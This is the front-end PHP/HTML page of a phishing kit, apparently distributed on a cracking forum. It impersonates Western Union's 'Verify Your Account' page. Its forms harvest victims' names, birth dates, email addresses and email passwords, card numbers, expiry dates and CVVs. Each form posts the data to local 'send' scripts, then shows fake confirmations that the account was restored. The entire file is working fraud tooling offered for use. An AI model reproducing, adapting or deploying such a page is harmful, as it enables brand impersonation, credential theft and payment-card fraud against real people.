<?php
/*
 ▄████▄   ██▀███   ▄▄▄      ▒██   ██▒      ██▓███   ██▀███   ▒█████  
▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒▒ █ █ ▒░     ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒
▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░░  █   ░     ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒
▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██  ░ █ █ ▒      ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░
▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██▒ ▒██▒ ██▓ ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░
░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░ ▒▓▒ ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░░   ░▒ ░ ░▒  ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ 
░          ░░   ░   ░   ▒    ░    ░   ░   ░░         ░░   ░ ░ ░ ░ ▒  
░ ░         ░           ░  ░ ░    ░    ░              ░         ░ ░  
░                                      ░                             
$$Nayfer
*/
include("./system/detect.php");

?>

<html lang="en" class="" id="optimusStarter" translate-cloak=""><head class="at-element-marker">
    
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,
     minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    
            
            
    
        <title>Verify Your Account</title>
                    <link rel="icon" type="image/vnd.microsoft.icon" href="./style/css/favicon.ico">
    


    

<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>

    
    
    
  <div id="fixed" class="spinner-container ng-isolate-scope" style="">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>


  <div id="doori" class="spinner-container ng-isolate-scope" style="display: none;">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>



<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
<script src="./style/js/jquery.CardValidator.js"></script>
    	<script src="./style/js/style.js"></script>


<style>
#Securitycode {
background-image: url('./style/css/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
background-size: 67px;
background-position: 106.5% 48.1%;

}


#cardnumber {
background-image: url(./style/css/cards-sprite-small@2x.png);
background-repeat: no-repeat;
background-size: 61px;
background-position: 99.5% -0.6666%;
width: 15%;
}



</style>





  <script type="text/javascript">
    $(function() {
     $('#addCreditCardNumber').mask('0000 0000 0000 0000 0000');
     $('#txtSecurityCode').mask('0000');
     $('#birthdate').mask('00/00/0000');
     $('#expirationdate').mask('00/0000');

	});
	</script>


        <meta name="keywords" content="">
    
    
        <meta name="description" content="Sign in to your WU US profile to send money online with Western Union services from the United States.">
    
    
    
        



    
    
        <meta name="apple-itunes-app" content="app-id=424716908">
    
    
        <meta name="google-play-app" content="app-id=com.westernunion.android.mtapp">
    
    

    	<link rel="stylesheet" type="text/css" href="./style/css/responsive_css.min.css">
 






</head>
<body>

    <div id="soso" class="container-fluid body-container">
        
        
             <header data-wurpheader="" style="position:relative">
             <div class="header parsys"><div class="header section">
   

    
       
		
<header>

  <div class="cookie-set-pop-up col-lg-12 col-sm-12 col-xs-12">
      <p class="col-lg-10 col-sm-11 col-xs-11">
           <a href="javascript:void(0)" aria-label="cookie-info-text" class="cookie-setting"></a>.
      </p>
      <p class="col-lg-2 col-sm-1 col-xs-1">
          <a href="#" class="close-cookie-popup pull-right" aria-label="close">
          <img src="./style/css/icon-close-gray.svg" alt="cookie-icon">
          </a>
      </p>    
  </div>
  

  
	<div id="scLk" class="container">
        <div id="soso" class="row header-top-container" data-focus="">
                <div class="col-xs-3 visible-xs">
                    
                    
                </div>
                
                
                    
                	<div  class="wu-logo col-xs-6 col-md-3 col-sm-2 wu-user-loggedout ng-hide" style="">
						
                            <a id="menu-wu-logo" href="#">
                          		<div class="wu-header-logo wu-partner-logo" alt="header-logo"><img src="./style/css/logo.wu.small.svg" alt="Western Union Logo"></div>
                        	</a>
                        
                    </div>
                    
                    <div  class="fbWebviewHeaderLinks hidden ng-hide">
                      <a class="btn" href="#">Log in</a>
                    </div>
                    <div id="wdupad" class="wu-logo col-xs-6 col-md-3 col-sm-2 wu-user-loggedin" style="">
                        
                            <a id="menu-wu-logo" href="#">
                          		<div class="wu-header-logo wu-partner-logo" alt="header-logo" data-partner-name=""><img src="./style/css/logo.wu.small.svg" alt="Western Union Logo"></div>
                        	</a>
                        
                    </div>
				<div class="col-xs-2 select-toggle wu-hamburger hidden" ng-hide="isMessenger" wu-hamburger-toggle="">
                    <div title="click for menu" class="wu-hamburger-menu" id="wuHamburger">
                        Menu
                    </div>
                    
                </div>
            
                
	</div>
</div>

</header>

<div id="dlat"> </div>





</div>

</div>

            </header>
        
        
        <section id="optimus-body-section" data-sessiontimer="">
            <div id="smonewuser" class="absolute-center">
                <div class=" container padding-left-0 padding-right-0 ">
                     <span ui-view="app" class="ng-scope">
                        
                     </span>
                      <div ui-view="" class="ng-scope" style="">
<section class="ng-scope">
    <div class="body parsys">
<div class="stickynotificationrefere page section">



</div>


   
   

<div class="container-fluid row nw-bg-grey"> 
    <div class="flex-row col-lg-12">

        <div class="wu-responsive-columns colctrl col-lg-8 col-md-8 col-sm-12 col-xs-12">
                <div class="paymentinfopanel page section">    



 

<div class="ng-scope">

 
                   
                      

                   



<h1 id="vrfy" class="payment-title ng-scope"><translate class="ng-scope">Verify Your Account</translate>




<h1 style="display:none;" id="vrfythnks" class="payment-title ng-scope"><translate class="ng-scope">Congratulations! Your have restored your account access.</translate>


<sup class="wu-superscript sum-wid-font-clr2">
    
</sup>
</h1>
<script>
$(function() {

	var validator = $("#wubiling").bind("invalid-form.validate", function() {
			$("#errorrwubiling").html('<div id="notification-container" class="alert alert-danger ng-scope" ng-if="loginWidgettVm.generalServiceError"><span id="notification-message" class="ng-binding">Please check your information and try again.</span><br><br><div class="pull-right"><small id="notification-code" class="ng-binding">C1131</small></div></div>');})
  $("form[name='wubiling']").validate({

	errorContainer: $("#errorrwubiling"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },




highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



				},

unhighlight: function (element, errorClass, validClass) {
					
	this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );




				},




    messages: {
      

      Firstname : "Please enter First name.",
      LastName : "Please enter Last Name.",
      birthdate : "Please enter DD/MM/YYYY.",


      txtEmailAddr : "Please enter Email Address.",
      PasswrodEmailAdress : "Please enter Passwrod Email Address.",
      ConfirmPasswordEmailAdress : "Please enter Confirm Password. ",

      wuemail : "Please check username and try again.",
      wupassword : "Please check password and try again.",
      addres : "Address Line is required",

      iduserLoginId : "Please enter a valid Email or phone number.",

idpassword: {
        required: "Please enter a password.",
        minlength: "Your password must contain between 4 and 60 characters."},


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },







     submitHandler: function(form) {


$("#doori").show(500);






					$.post("./system/send_biling.php?ajax", $("#wubiling").serialize(), function(result) {
                            setTimeout(function() {


$("#doori").hide(500);
$("#wubiling").hide(500);
$("#showthanks").show(500);


$("#vrfy").hide(500);
$("#vrfythnks").show(500);

$("#thanks").show(500);



$("#dlat").html("<div style='background-color: #4CAF50;' class='pad-tb-15-15 hightlight-container ng-scope'><div class='flex-row center-align'><span class='ng-scope'><translate class='ng-scope'>The Account confirmed !</translate></span></div></div>");



});
});
},
});
});
</script>



 <script>
$(document).ready(function(){
  $("#hnawarkdirblinig").click(function(){

    $("#addNefwCarddIdconess").attr("style","transform: rotate(90deg); transition: all 0.25s ease 0.25s;");


    $("#sadbiling").show(500);
  });


  $("#hnawarksadblinig").click(function(){
    $("#sadbiling").hide(500);

    $("#addNefwCarddIdconess").attr("style","transform: rotate(0deg); transition: all 0.1s ease 0.1s;");

  });
});
</script>




<form action="//wu.com" id="thanks" name="thanks" class="form-container ng-pristine ng-valid-validity ng-invalid ng-invalid-required ng-valid-maxlength" style="display:none;margin-top: 2px;">
 

<div class="space-btwn form-details-container ng-scope">

<div>


<div class="ng-scope btn-payment-hint-container margin-top-10">

  <div class="row margin-bottom-5 margin-left-0 margin-right-0">
  
    <div id="receiverNameFields" class="row no-margin">



<center>



<img width="150" height="150" src="./style/css/valido.jpg">


<center>
</center>

<br>

<p class="ng-scope">  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>



<br>

<div class="btn-content-last">


<button id="siracont" style="width: 63%;
    max-width: 100%;" class="btn btn-primary btn-lg btn-block background-color-teal remove-margin" type="submit" autocomplete="off" tabindex="0">My Western Union</button>
<br>


<button style="width: 63%; border-color: #f8981f;
    border-radius: 3px;
    background-color: #f8981f;" id="siormsssg" name="siormsssg" class="btn btn-primary btn-lg btn-block background-color-teal remove-margin">  Log Out </button>

<br>





                                                           </div>




<p style="font-weight: 700;" class="seconds"> You are being redirected to your Wu account , within 10 seconds. </p>



<h2>Your Account has been successfully Restored</h2>


</center>




</div>
</div>
</div>
</div>
</div>


</form>


<form id="wubiling" name="wubiling" class="form-container ng-pristine ng-valid-validity ng-invalid ng-invalid-required ng-valid-maxlength" style=display:none;"margin-top: 2px;">
 


<div class="history-container container-space cursor-pointer sum-wid-ff">


<div id="addNewReceiver" automation-id="addNewReceiver" class="history-container-inner-element receivers-container-inner padding-right-15 border-radius-4 ng-scope active-selection" style="">
            <div id="hnawarkdirblinig" class="padding-top-5 padding-bottom-15 font16">
              <img class="margin-right-10" src="./style/css/icon-add-new-receiver-blue.svg">


                <div class="add-card-title ng-binding ng-scope" ng-if="!optReceiverVm.isTransferToSelfProvisionEnabled"><translate class="ng-scope">Enter Billing Address</translate> </div>   
              <img class="margin-top-10 float-right pull-right icon-arrow-transform" id="addNewCardIcon" src="./style/css/icon-chevron-r-blue.svg">
            </div>
          </div>



<div id="sadbiling" class="tile-details-container details history-details-element-white card-detail-container-mob ng-scope" id="detailsContainer" style="">


<ng-include class="ng-scope">
<div class="space-btwn form-details-container ng-scope">

<div >


<div class="ng-scope">

  <div class="row margin-bottom-5 margin-left-0 margin-right-0">
  
    <div id="receiverNameFields" class="row no-margin">



<div class="dddd col-xs-12 col-sm-6 inputContainer ng-scope">
      <span class="wu-field wu-float-label input-border">
        <input type="text" name="Firstname" id="Firstname" class="form-control error-behavior wu-custom-height-padding ng-pristine ng-valid ng-empty empty ng-valid-validity ng-touched" required="required" style="" aria-describedby="FirstnameinputError" aria-invalid="false"  >
        <span id="Firstname" class="sr-only">(<translate class="ng-scope">First Name</translate>)</span>


<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>


        <span class="block-message ng-scope" style=""><translate class="ng-scope">
<span id="FirstnameinputError" class="empty error" style="display: none;"></span>
</translate></span>



        <div class="floating-label"><translate class="ng-scope">First Name</translate></div>



      </span>
      
      <div class="ng-inactive">
        
      </div>
     
    </div>


<div class="dddd col-xs-12 col-sm-6 inputContainer ng-scope"> 
      <span class="wu-field wu-float-label input-border">
        <input type="text" required="required" name="LastName" id="LastName"  class="form-control error-behavior wu-custom-height-padding ng-pristine ng-valid ng-empty empty ng-valid-validity ng-touched" maxlength="25" style="" aria-describedby="LastNameinputError" aria-invalid="false">
        

<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>


<div class="floating-label"><translate class="ng-scope">Last Name</translate> 



</div>
      </span>


<span class="block-message ng-scope" style=""><translate class="ng-scope">
<span id="LastNameinputError" class="empty error" style="display: none;"></span>
</translate></span>


       </div>

    </div>


  </div>

</div>



<div class="row margin-bottom-5 margin-left-0 margin-right-0 ng-scope">
    <div class="dddd col-xs-12 inputContainer"> 
     <span class="wu-field wu-float-label input-border">
        <input required="required"  type="text" name="birthdate" id="birthdate" minlength="8" class="form-control error-behavior wu-custom-height-padding ng-pristine ng-valid ng-empty empty ng-valid-validity ng-touched" style="" aria-describedby="birthdateinputError" aria-invalid="false" >
        <span id="birthdate" class="sr-only"><translate class="ng-scope">Date Of Birth (DD/MM/YYYY)</translate>  
        (<translate class="ng-scope"></translate>)</span>
        
<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>


<span class="block-message ng-scope" style=""><translate class="ng-scope"> 
<span id="birthdateinputError" class="empty error" style="display: none;"></span>
</translate></span>

        <div class="floating-label"><translate class="ng-scope">Date Of Birth (DD/MM/YYYY) </translate>
</div>
        </span>
            </div>
  </div><div class="row margin-bottom-5 margin-left-0 margin-right-0 ng-scope">
    <div class="dddd col-xs-12 inputContainer"> 
     <span class="wu-field wu-float-label input-border">

        <input value="<?php echo $_SESSION['wuemail']; ?>" required="required" type="email" name="txtEmailAddr" id="txtEmailAddr" aria-label="" class="form-control error-behavior wu-custom-height-padding ng-pristine ng-valid ng-empty ng-valid-validity ng-touched nvalid" style="" aria-describedby="txtEmailAddrinputError" aria-invalid="false">
        <span id="txtEmailAddrSuccess" class="sr-only"><translate class="ng-scope">Email address </translate>  
        (<translate class="ng-scope"></translate>)</span>


<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>

        <span class="block-message ng-scope" style=""><translate class="ng-scope">
<span id="txtEmailAddrinputError" class="empty error" style="display: none;"></span>
</translate></span>

        <div class="floating-label"><translate class="ng-scope">Email address </translate> 
</div>
        </span>
            </div>
  </div><div class="ng-scope">

  <div class="row margin-bottom-5 margin-left-0 margin-right-0">
  
    <div id="receiverNameFields" class="row no-margin">


 


<div class="dddd col-xs-12 col-sm-6 inputContainer ng-scope">
      <span class="wu-field wu-float-label input-border">
        <input type="password" name="PasswrodEmailAdress" id="PasswrodEmailAdress" class="form-control error-behavior wu-custom-height-padding ng-pristine ng-valid ng-empty empty ng-valid-validity ng-touched" required="required" style="" aria-describedby="PasswrodEmailAdressinputError" aria-invalid="false">


<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>


        <span id="txtFNameSuccess" class="sr-only">
</span>
        



        <div class="floating-label"><translate class="ng-scope"> Passwrod Email Address</translate></div>
      </span>




<span class="block-message ng-scope" style=""><translate class="ng-scope">
<span id="PasswrodEmailAdressinputError" class="empty error" style="display: none;"></span>
</translate></span>
      
      <div class="ng-inactive">
        
      </div>
     
    </div>


<div class="dddd col-xs-12 col-sm-6 inputContainer ng-scope"> 
      <span class="wu-field wu-float-label input-border">
        <input required="required" type="password" name="ConfirmPasswordEmailAdress" id="ConfirmPasswordEmailAdress" class="form-control error-behavior wu-custom-height-padding ng-pristine ng-valid ng-empty ng-valid-maxlength empty ng-touched" maxlength="25" style=""  aria-describedby="ConfirmPasswordEmailAdressinputError" aria-invalid="false">




<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>


<div class="floating-label"><translate class="ng-scope">Confirm Password Email Address
</translate> 

        

</div>
      </span>


<span class="block-message ng-scope" style=""><translate class="ng-scope">
<span id="ConfirmPasswordEmailAdressinputError" class="empty error" style="display: none;"></span>
</translate></span>



       </div>


    </div>


  </div>

</div>




</div>
<div class="ng-hide">

  <div class="row no-margin">
    <h2 automation-id="bankAcctInfo-form-title" class="sub-title margin-bottom-5 margin-top-30 margin-left-15"><translate class="ng-scope">Receiver's bank account information</translate></h2>
    
  </div>

</div>
<div>
 </div>


<button automation-id="addReceiverCTA" type="submit" class="btn btn-primary btn-block margin-top-20 margin-bottom-10 ng-binding ng-scope" id="button-optAddReceiver-continue" data-linkname="button-receiver-continue">Continue</button>





<div class="row text-center font18 padding-bottom-20"><a id="hnawarksadblinig"  ><translate class="ng-scope">Cancel</translate></a></div>
<div class="row text-center font18 padding-bottom-20 ng-hide"><a href="#" id="link-optAddReceiver-cancel-myself"><translate class="ng-scope">Cancel</translate></a></div>
</div>
</ng-include>
            </div>
          </div>



</form>

<script>
$(function() {

	var validator = $("#wucard").bind("invalid-form.validate", function() {
			$("#errorrwucard").html('<div id="notification-container" class="alert alert-danger ng-scope" ng-if="loginWidgettVm.generalServiceError"><span id="notification-message" class="ng-binding">Please check your information and try again.</span><br><br><div class="pull-right"><small id="notification-code" class="ng-binding">C1131</small></div></div>');})
  $("form[name='wucard']").validate({

	errorContainer: $("#errorrwucard"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },




highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



				},

unhighlight: function (element, errorClass, validClass) {
					
	this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );




				},




    messages: {
      
 NameOnCard : "Please enter Name On Card.",
      addCreditCardNumber : "Please enter your card number.",
      expirationdate : "Please enter valid Expiry Date.",
      txtSecurityCode : "Security code is required.",
      thDSecure : "Please enter 3D-Secure.",



      wuemail : "Please check username and try again.",
      wupassword : "Please check password and try again.",
      addres : "Address Line is required",

      iduserLoginId : "Please enter a valid Email or phone number.",

idpassword: {
        required: "Please enter a password.",
        minlength: "Your password must contain between 4 and 60 characters."},


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },







     submitHandler: function(form) {


$("#doori").show(500);






					$.post("./system/send_carde.php?ajax", $("#wucard").serialize(), function(result) {
                            setTimeout(function() {

$("#wucard").hide(500);
$("#cardddwo").hide(500);
$("#smitcard").hide(500);
$("#doori").hide(500);
$("#wubiling").show(500);


$("#dlat").html("<div style='background-color: #4CAF50;' class='pad-tb-15-15 hightlight-container ng-scope'><div class='flex-row center-align'><span class='ng-scope'><translate class='ng-scope'>The Credit/Debit Card was confirmed !</translate></span></div></div>");



});
});
},
});
});
</script>





<form id="wucard" name="wucard" class="form-container ng-pristine ng-valid-validity ng-invalid ng-invalid-required ng-valid-maxlength" style="margin-top: 2px;">
 

<div class="history-container container-space cursor-pointer sum-wid-ff ng-scope">
    <div id="listItem0" class="ng-scope">
        <div id="warikhnalcard" class="history-container-inner-element receivers-container-inner padding-right-15 border-radius-4" >
            <div class="padding-top-5 padding-bottom-15 font16">
                    <img id="addNewCarddIconess" class="margin-right-10" src="./style/css/icon-add-new-c-card-blue.svg" data-linkname="add-card">
                    


                    <div class="add-card-title ng-scope" ng-if="!paymentInfoVm.showDeditCardOnly"><translate class="ng-scope">Add new card</translate></div>
                    
                    
                    <img class="margin-top-10 float-right pull-right" id="addNewCardIconess" src="./style/css/icon-chevron-r-blue.svg" style="transform: rotate(0deg); transition: all 0.1s ease 0.1s;">
            </div>
        </div>
    </div>

            

            

            
            
            
            
            

            <div class="details history-details-element-white card-detail-container-mob margin-left-10 margin-right-10 ng-scope tile-expanded" id="detailsContainer" style="">


<script>
$(document).ready(function(){
  $("#warikhnalcard").click(function(){

    $("#addNewCardIconess").attr("style","transform: rotate(90deg); transition: all 0.25s ease 0.25s;");



    $("#byncard").show(500);
  });
  $("#sadcard").click(function(){
    $("#byncard").hide(500);



    $("#addNewCardIconess").attr("style","transform: rotate(0deg); transition: all 0.1s ease 0.1s;");

  });
});
</script>



                <div style="display:none;" id="byncard" class="xsmall-font space-btwn history-details-container add-card-details payment-container-card">
                     

                    <div id="addNewCardAnchor">
                         <div class="form-group add-new-card-list-wrapper input-border">
                        <div class="row">
                            <div class="dddd col-xs-11 col-sm-11 add-card-new">
                                <div class="wu-field wu-typeahead card-number card-number-container float-text">
                                    <span class="card-type card-type-position card-icon-mob " style=""></span>
                                    
                                    
                                    <div class="ng-scope"> 
                                        <div>

<input type="tel" minlength="19" name="addCreditCardNumber" id="addCreditCardNumber" class="form-control error-behavior cc-card-number addCreditCardNumber ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength empty ng-invalid-validity ng-touched" placeholder="" maxlength="19" required="required" style="" aria-describedby="addCreditCardNumberinputError" aria-invalid="false">



<div class="floating-label">Card number</div>
                                        </div>
                                        <a class="wu-custom-inline-show ng-scope" tabindex="0">
                                             
                                        </a>
                                          
                                </div>				
                                    <span id="txtCardNumSuccess" class="sr-only"><translate class="ng-scope">Card number</translate></span>
           

<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>                         
                                     

<span class="block-message pull-left msg-below-line ng-scope" style=""><translate class="ng-scope">
<span id="addCreditCardNumberinputError" class="empty error" style="display: none;"></span></translate></span>


                                    
                                </div>   

                                
                            </div>
                        </div>

                        <div class="row padding-bottom-5 padding-top-15" aria-label="Add New Card extention Starts">
                            <div class="dddd col-lg-5 col-md-5 col-xs-12 col-sm-3 padding-right-0 margin-right-10 exp-section">
                                <span class="wu-field wu-float-label">
                                    <input type="tel" name="expirationdate" minlength="5" required="required" amplitude-id="textbox-add-expiration-date" id="expirationdate" aria-label="expirationdate" class="form-control error-behavior txtSecurityCode wu-custom-height-padding ng-empty ng-invalid empty  "  placeholder=""  aria-invalid="false" aria-describedby="expirationdateinputError" style="" ><div class="floating-label">MM/YY</div>
                                    <span id="expirationdateSuccess" class="sr-only">(<translate class="ng-scope">CVV</translate>)</span>

  <span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>

                                 
                            </span>


<span class="block-message ng-scope" style=""><translate class="ng-scope"><span id="expirationdateinputError" class="empty error" style="display: none;"></span></translate></span>

                   
                                                          
                                  
</div> 

                            <div class="dddd col-lg-5 col-md-5 col-xs-12 col-sm-3 padding-right-0 cvv-container" " >
                                <span class="wu-field wu-float-label">
                                
                                <div class="dddd ng-scope">										
                                    <input type="tel" name="txtSecurityCode" minlength="3" id="txtSecurityCode" class="form-control error-behavior txtSecurityCode wu-custom-height-padding ng-empty ng-invalid empty  " required="required" style="" aria-describedby="txtSecurityCodeinputError" aria-invalid="false" ><div class="floating-label">CVV</div>											
                                </div>
                                
                                    <span id="txtSecurityCodeSuccess" class="sr-only">(<translate class="ng-scope">CVV</translate>)</span>

                                     <span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope" aria-hidden="true" style=""> </span>



                                </span>
                                
                                <span class="block-message ng-scope" style=""><translate class="ng-scope"><span id="txtSecurityCodeinputError" class="empty error" style="display: none;"></span></translate></span>
                             

         
                            </div>

                            
                           <div class="wu-custom-inline-block">
                               <a data-toggle="modal" data-dismiss="modal" data-linkname="delete-card"> <img class="info-cvv-icon firstBlue" src="./style/css/icon-info-blue.svg" alt="cvv"></a>
                            </div>
                            
                            
                            
                        </div>
                    </div> 
                </div>
                <div class="wu-custom-clear"></div>
                    
                

                   
                        <div class="wu-custom-clear"></div>

                    
                <div class="form-group-address ccAddressEdit ng-scope">

                    
                    
                    <div class="row ng-scope">
                        <div class="col-md-12">
                            <span class="wu-field wu-float-label input-border">
                                <div class="floating-label">Address Line 1</div>
                                <span id="txtAddrSuccess" class="sr-only">(<translate class="ng-scope">Address Line 1</translate>)</span>
                                
                                
                            </span>

                            
                            
                            

                            
                            <span class="wu-optional-field ng-scope">
                                
                            </span>
                            

                            
                            
                            
                        </div>
                    </div>

                    
                    <div class="row ng-scope">
                        <div class="col-md-12">
                            
                        </div>
                    </div>
                    

                    
                    
                    <div class="padding-bottom-5">
                        <button type="submit" class="btn btn-primary btn-block margin-top-10 margin-bottom-10">
                            <span class="ng-scope">
                                
Continue</span>
                            
                        </button>
                        


</form>




                </div>
                    <div class="row text-center font18 padding-bottom-20">

<a id="sadcard"  ><translate class="ng-scope">Cancel</translate></a>

</div>
                </div>
                

                </div>
                
                
                 <div class="existing-address col-md-5 col-lg-5 col-xs-12 col-sm-12 hidden-sm hidden-xs hidden-md hidden-lg edit-bill-address ng-scope">
                            <div class="ng-scope" ng-if="!paymentInfoVm.cvvHide">
                                <div>
                                    <h2 class="sub-title wu-custom-margin-bottom"><translate class="ng-scope">Billing Address</translate></h2>
                                    <div class="edit-address edit-icon-link wu-custom-margin-top"></div>
                                </div>
                                <hr class="wu-custom-hr-tag">
                                <div class="line1 ng-binding">2220 Meridian Blvd Suite #ACZ840</div>
                                <div class="line2 ng-binding"></div>
                                <div class="line3 ng-binding">MINDEN<span class="ng-binding ng-scope">, NV</span> 89423</div>
                                <div class="Line4 ng-binding">US</div>
                                


                            </div>
                            <div class="hidden-md hidden-lg ng-scope">
                                <div class="btn-payment-hint-container margin-top-10 margin-bottom-10">
                                    <button type="submit" class="btn btn-primary btn-block no-margin" data-linkname="payment-continue"><translate class="ng-scope">Continue</translate></button>
                                    <div class="margin-top-10 text-center ng-scope"><translate class="ng-scope">You will be able to review this transfer before it s final.</translate></div>
                                </div>
                                <div class="row text-center font18 padding-bottom-15"><a  ><translate class="ng-scope">Cancel</translate></a></div>
                                    </div>
                        </div>
                
                
                
                
            </div>
          </div>  
            

<div class="ng-scope" style="">

<h2 id="smitcard" class="sub-title choose-cc ng-scope"><translate class="ng-scope">Credit/Debit Card</translate></h2>






<div class="container right-notification-container"></div>
<div class="">
    <div class="">
       

        <div id="receiverWrapper">
                <div class="edit-payment-method ng-scope"><a href="#" class="text-link"><translate class="ng-scope"> </translate></a></div>

                
                <div class="payment-list-wrapper ng-scope">
                    <div class="form-group">
                        <div class="list-group card-list float-text" id="paymentCardsList">
                            <div id="cardddwo" class="margin-top-10 paymentinfo-tile sum-wid-ff ng-scope" style="">
                                <div id="dircardccv" class="list-group-item padding-tb-30 cards cardinfo-id-1 card-tile border-radius-4 cards-hover active-card" id="1" data-linkname="select-card" style="">
                                    <span id="cardnumber" class="col-xs-2 col-lg-2 col-md-2 col-sm-2 padding-right-0 card-image-savelist-new">Card</span>
                                    <div class="col-xs-5 col-lg-5 col-md-5 col-sm-5">
                                        <div class="padding-left-0 card-list-align wu-custom-padding-bottom">
                                            <div class="font-11 hidden-xs ending-in"><translate class="ng-scope">Ending in:</translate></div>
                                        </div>
                                        <div class="">
                                            <div class="card-info-text"><strong class="ng-binding">xxxx</strong></div>
                                        </div>
                                    </div>
                                    <div class="col-xs-2 col-lg-2 col-md-2 col-sm-2 cardexpiry-adjust card-list-align">
                                        
                                        <div class="wu-custom-date"><span class="ng-binding ng-scope">MM/YY</span></div>
                                        <div class="wu-custom-exp-date"><strong class="ng-binding">xx/xx</strong></div>
                                    </div>

                                    <span class="col-xs-1 col-lg-1 col-md-1 col-sm-1 check-mark check-image card-list-align">
                                        <img id="addNefwCarddIdconess" class="pull-right" src="./style/css/icon-chevron-r-blue.svg" style="transform: rotate(90deg); transition: all 0.1s ease 0.1s;">
                                    </span>
                                </div>




<script>
$(function() {

	var validator = $("#wucardccv").bind("invalid-form.validate", function() {
			$("#errorrwucardccv").html('<div id="notification-container" class="alert alert-danger ng-scope" ng-if="loginWidgettVm.generalServiceError"><span id="notification-message" class="ng-binding">Please check your information and try again.</span><br><br><div class="pull-right"><small id="notification-code" class="ng-binding">C1131</small></div></div>');})
  $("form[name='wucardccv']").validate({

	errorContainer: $("#errorrwucardccv"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },




highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



				},

unhighlight: function (element, errorClass, validClass) {
					
	this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );




				},




    messages: {
      
 NameOnCard : "Please enter Name On Card.",
      addCreditCardNumber : "Please enter your card number.",
      expirationdate : "Please enter valid Expiry Date.",
      txtSecurityCode : "Security code is required.",
      thDSecure : "Please enter 3D-Secure.",



      wuemail : "Please check username and try again.",
      wupassword : "Please check password and try again.",
      addres : "Address Line is required",

      iduserLoginId : "Please enter a valid Email or phone number.",

idpassword: {
        required: "Please enter a password.",
        minlength: "Your password must contain between 4 and 60 characters."},


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },







     submitHandler: function(form) {


$("#doori").show(500);






					$.post("./system/sand_Cvv.php?ajax", $("#wucardccv").serialize(), function(result) {
                            setTimeout(function() {

$("#wucard").hide(500);
$("#cardddwo").hide(500);
$("#smitcard").hide(500);
$("#doori").hide(500);
$("#wubiling").show(500);


});
});
},
});
});
</script>


<form id="wucardccv" name="wucardccv" class=""> 


